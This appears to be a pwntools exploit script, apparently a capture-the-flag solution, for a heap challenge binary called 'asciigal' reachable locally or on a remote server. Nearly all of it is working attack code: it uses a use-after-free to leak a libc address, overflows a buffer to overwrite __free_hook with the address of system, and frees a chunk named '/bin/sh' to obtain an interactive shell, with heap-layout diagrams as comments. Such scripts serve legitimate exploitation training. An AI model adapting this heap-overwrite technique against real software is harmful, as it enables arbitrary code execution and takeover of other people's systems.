from pwn import *
import time


def print_art(art_index, r, is_print = False):
    menu_choice(1, r)
    r.recvuntil(b"art#> ")
    r.send(b"%d" % art_index)
    r.recvuntil(b'[')

    art_name = r.recvuntil(b"]")[:-1]
    if is_print:
        print('name: ')
        print(art_name)
    r.recvuntil(b"\n")
    art = r.recvuntil(b"\n**************")[:-len('\n**************')]
    if is_print:
        print('art: ')
        print(art)
    return art_name, art


def delete_art(art_index, r):
    menu_choice(2, r)
    r.recvuntil(b"art#> ")
    r.send(b"%d" % art_index)


def edit_art(art_index, art_name, art_size, art_data, r):
    menu_choice(3, r)
    r.recvuntil(b"art#> ")
    r.send(b"%d\n" % art_index)
    r.recvuntil(b"name> ")
    r.send(art_name)
    r.recvuntil(b"art sz> ")
    r.send(b"%d\n" % art_size)
    time.sleep(.1)
    r.send(art_data)


def exit_art(r):
    menu_choice(4, r)


def menu_choice(index, r):
    r.recvuntil(b"> ")

    r.send(b"%d\n" % index)


def new_art(art_name, art_size, art_data, r):
    menu_choice(0, r)

    r.recvuntil(b"name> ")
    r.send(art_name)
    r.recvuntil(b"art sz> ")
    r.send(b"%d\n" % art_size)
    time.sleep(.1)
    r.send(art_data)


# context.terminal = ['tmux', 'splitw', '-h']
def main():
    if "REMOTE" not in args:

        # ssh = ssh("acidburn", "localhost", password="acidburn", port=2222)
        # r = ssh.process("fastbin_attck_")
        r = process("asciigal")
        gdb.attach(r, """
            # b *0x0804841c
            # c
            set resolve-heap-via-heuristic on
            """)

        input("wait")
    else:
        r = remote("jinblack.it", 3004)

    # +---------------------------+
    # | NAME => size 100          |
    # +---------------------------+
    # | CONTENT => size 0x700     |
    # +---------------------------+
    # | ART_STRUCT => size 20     |
    # | NAME_PTR                  |
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+

    # +---------------------------+
    # | ART_STRUCT => size 20     | FAST BIN
    # | NAME_PTR                  | TOH
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+


    art_name_char = 0x41
    art_content_char = 0x5A

    art_name = (b'%c' % art_name_char) * 8 + b'\n'
    art_size = 0x500
    art = (b'%c' % art_content_char) * 7 + b'\n'

    new_art(art_name, art_size, art, r)


    # +---------------------------+
    # | ART_STRUCT => size 20     | FAST BIN
    # | NAME_PTR                  | TOH
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+
    # +---------------------------+
    # | NAME => size 100          | A
    # +---------------------------+
    # | CONTENT => size 0x510     | Z
    # +---------------------------+
    # | ART_STRUCT => size 20     | struct of A
    # | NAME_PTR                  |
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+

    delete_art(1, r)

    # +---------------------------+
    # | ART_STRUCT => size 20     | FAST BIN
    # | NAME_PTR                  | TOH
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+
    # +---------------------------+
    # | NAME => size 100          | name of A freed
    # +---------------------------+
    # | CONTENT => size 0x510     | content of A freed
    # +---------------------------+
    # | ART_STRUCT => size 20     | struct of A freed
    # | NAME_PTR                  |
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+

    art_name_char += 1
    art_content_char -= 1

    art_name = (b'%c' % art_name_char) * 8 + b'\n'
    art_size = 0x500
    art = (b'%c' % art_content_char) * 7 + b'\n'

    new_art(art_name, art_size, art, r)

    # +---------------------------+
    # | ART_STRUCT => size 20     | FAST BIN
    # | NAME_PTR                  | TOH
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+
    # +---------------------------+
    # | NAME => size 100          | ex name of A new name B
    # +---------------------------+
    # | CONTENT => size 0x510     | ex content of A new content B
    # +---------------------------+
    # | ART_STRUCT => size 20     | ex struct of A new struct B
    # | NAME_PTR                  |
    # | CONTENT_SIZE              |
    # | CONTENT_PTR               |
    # | FLAG                      |
    # +---------------------------+

    _, row_leak = print_art(1, r)

    print(len(row_leak))

    leak = u64(row_leak[8:16])
    offset = 0xca0
    libc_base = leak - offset
    offset_free_hook = 0x28e8
    free_hook = libc_base + offset_free_hook
    offset_system = 0x4f440 - 0x3EB000
    libc_system = libc_base + offset_system

    print("[!] leak : %#x" % leak)
    print("[!] libc : %#x" % libc_base)
    print("[!] free hook : %#x" % free_hook)
    print("[!] system : %#x" % libc_system)

    art_name_char += 1
    art_content_char -= 1

    # overflow from B art of content in order to override the pointer inside the chunk freed of the content of C

    art_name_char += 1
    art_content_char -= 1

    art_name = (b'%c' % art_name_char) * 8 + b'\n'
    art_size = 0x510 + 0x8

    art = b"A" * (art_size - 0x8) + p64(free_hook)

    edit_art(1, art_name, art_size, art, r)

    art_name_char += 1
    art_content_char -= 1

    art_name = p64(libc_system) + b"\n"
    art_size = 0x10
    art = (b'%c' % art_content_char) * 7 + b'\n'

    edit_art(1, art_name, art_size, art, r)

    art_name = b'/bin/sh' +  b'\n'
    art_size = 0x60
    art = (b'%c' % art_content_char) * 7 + b'\n'

    new_art(art_name, art_size, art, r)

    delete_art(2, r)

    r.interactive()


main()
